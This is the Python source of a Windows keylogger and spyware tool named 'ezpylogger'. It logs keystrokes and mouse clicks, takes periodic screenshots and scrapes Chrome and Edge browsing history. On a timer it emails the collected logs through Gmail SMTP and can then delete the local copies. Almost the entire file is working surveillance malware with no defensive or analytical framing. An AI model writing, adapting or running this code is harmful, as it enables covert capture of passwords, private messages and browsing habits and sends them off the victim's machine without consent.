import os, json, win32api, traceback
from time import sleep
from threading import Timer
from pynput import keyboard, mouse # Keylogger
from PIL.ImageGrab import grab as screenshot # Screenshots
import sqlite3 # Browser history
import smtplib, ssl # Email
from email.message import EmailMessage # Email



CONFIG = {}
LOGS_PATHNAMES = set()



# Returns the next filename in a sequence
def next_filename_index(folder: str, str_format: str):
    index = 0
    while ( os.path.exists( os.path.join(folder, str_format.format(index=index)) ) ):
        index += 1
    return os.path.join(folder, str_format.format(index=index))

# Returns the number of seconds since the last user input
def inactivity_seconds():
    return (win32api.GetTickCount() - win32api.GetLastInputInfo()) / 1000.0

# Calls a function every x seconds
def set_interval(fun, sec: int, wait=True):
    if (wait == False):
        fun()
    Timer(sec, lambda:set_interval(fun, sec, False)).start()



last_click = None

# Writes a string to the keylog file
def keylog_write_string(string: str):
    #print(string, end="")

    filepath = os.path.join(CONFIG["logs_location"], CONFIG["keylogger"]["filename"])
    LOGS_PATHNAMES.add(filepath)

    with open(filepath, "a+") as f:
        f.write(string)

    if (string == "[QUIT]"):
        raise os._exit(0)

# Writes a key press to the keylog file
def keylog_write_key(key: keyboard.Key):
    # Is a numpad key (weird behavior with these)
    if (hasattr(key, "vk") and key.vk >= 96 and key.vk <= 111):
        string = f"[{str(key.vk)}]"

    # Is an alphanumeric key
    elif (hasattr(key, "char") and key.char != None):
        # escape sequence (CTRL + key)
        if (len(str(key)[1:-1]) == 4):
            string = f"[CTRL^{str(chr(key.vk))}]"
        # no escape sequence
        else:
            string = str(key.char)

    # Is a special key
    elif (hasattr(key, "name")):
        string = f"[{str(key.name).upper()}]"

    # Is anything else (fallback)
    else:
        string = f"[{str(key)}]"

    if (string in CONFIG["keylogger"]["replace"]):
        string = CONFIG["keylogger"]["replace"][string]

    if (string == ""):
        return
    else:
        global last_click
        last_click = None

    keylog_write_string(string)

# Writes a mouse click to the keylog file
def keylog_write_click(x: int, y: int, button: mouse.Button, pressed: bool):
    if (pressed):
        string = button.name.upper()

        global last_click
        if (CONFIG["mouselogger"]["ignore_same"] and last_click == string):
            return
        else:
            last_click = string

        if (string in CONFIG["mouselogger"]["replace"]):
            string = CONFIG["mouselogger"]["replace"][string]

        if (string == ""):
            return

        letter = CONFIG["mouselogger"]["string_format"].format(btn=string, x=x, y=y)
        keylog_write_string(letter)



# Take a screenshot and save it
def take_screenshot():
    if (CONFIG["screenshots"]["inactivity_skip"] == False or inactivity_seconds() < CONFIG["screenshots"]["interval"]):

        filepath = next_filename_index(CONFIG["logs_location"], CONFIG["screenshots"]["filename_format"])
        LOGS_PATHNAMES.add(filepath)

        screenshot().save(filepath)



# Log a browser history file
def log_browser_history(name: str, path: str, query: str):
    if (os.path.exists(path) == False):
        return

    connection = sqlite3.connect(path)
    cursor = connection.cursor()

    cursor.execute(query)
    urls = list(sum(cursor.fetchall(), ()))

    cursor.close()
    connection.close()

    filepath = os.path.join(CONFIG["logs_location"], CONFIG["history"]["filename_format"].format(browser=name))
    LOGS_PATHNAMES.add(filepath)

    with open(filepath, "w+") as f:
        f.write("\n".join(urls))

# Scrape all browser history files
def scrape_browsers_history():
    CHROMIUM_QUERY = "select url from urls order by last_visit_time desc"
    CHROMIUM_PATH = os.path.join("User Data", "Default", "History")

    if (CONFIG["history"]["limit"] == None):
        QUERY_LIMIT = ""
    else:
        QUERY_LIMIT = " limit " + str(CONFIG["history"]["limit"])

    BROWSER_HISTORY_DICT = {
        "chrome": {
            "path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", CHROMIUM_PATH),
            "query": CHROMIUM_QUERY + QUERY_LIMIT
        },
        "edge": {
            "path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", CHROMIUM_PATH),
            "query": CHROMIUM_QUERY + QUERY_LIMIT
        }
    }

    for browser in BROWSER_HISTORY_DICT:
        log_browser_history(browser, BROWSER_HISTORY_DICT[browser]["path"], BROWSER_HISTORY_DICT[browser]["query"])



# Send an email
def send_email(from_email: str, to_email: str, password: str, subject="", body="", attachments=[]):
    msg = EmailMessage()
    msg["From"] = from_email
    msg["To"] = to_email
    msg["Subject"] = subject
    msg.set_content(body)

    for attachment in attachments:
        with open(attachment, "rb") as f:
            attachment_data = f.read()
            attachment_name = os.path.basename(attachment)

        msg.add_attachment(attachment_data, maintype="application", subtype="octet-stream", filename=attachment_name)

    context = ssl.create_default_context()

    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as smtp:
        smtp.login(from_email, password)
        smtp.sendmail(from_email, to_email, msg.as_string())

# Send an email to self with the configured logs attached
def send_configured_email():
    email = CONFIG["email"]["email"]
    password = CONFIG["email"]["password"]

    subject = os.getlogin() + "'s ezpylogger logs"

    attachments = list(LOGS_PATHNAMES)
    LOGS_PATHNAMES.clear()

    send_email(email, email, password, subject, "", attachments)

    print("Email sent with attachments: ", attachments)

    if (CONFIG["email"]["delete_after"]):
        for filepath in attachments:
            os.remove(filepath)



# Load config
def load_config():
    with open("config.json") as f:
        global CONFIG
        CONFIG = json.load(f)

# Start logging
def start_logging():
    if (os.path.exists(CONFIG["logs_location"]) == False):
        os.mkdir(CONFIG["logs_location"])

    if (CONFIG["keylogger"]["enabled"]):
        keyboard.Listener(on_press=keylog_write_key).start()

    if (CONFIG["mouselogger"]["enabled"]):
        mouse.Listener(on_click=keylog_write_click).start()

    if (CONFIG["screenshots"]["enabled"]):
        set_interval(take_screenshot, CONFIG["screenshots"]["interval"])

    if (CONFIG["history"]["enabled"]):
        set_interval(scrape_browsers_history, CONFIG["history"]["interval"])

    if (CONFIG["email"]["enabled"]):
        set_interval(send_configured_email, CONFIG["email"]["interval"])



# Main
try:
    load_config()
    start_logging()

    # Keep the script running
    while True:
        sleep(3600)
except:
    try:
        ERROR_LOG_PATHNAME = os.path.join(".", "error.txt")

        with open(ERROR_LOG_PATHNAME, "w+") as f:
            f.write(traceback.format_exc())
    except:
        pass

os._exit(0)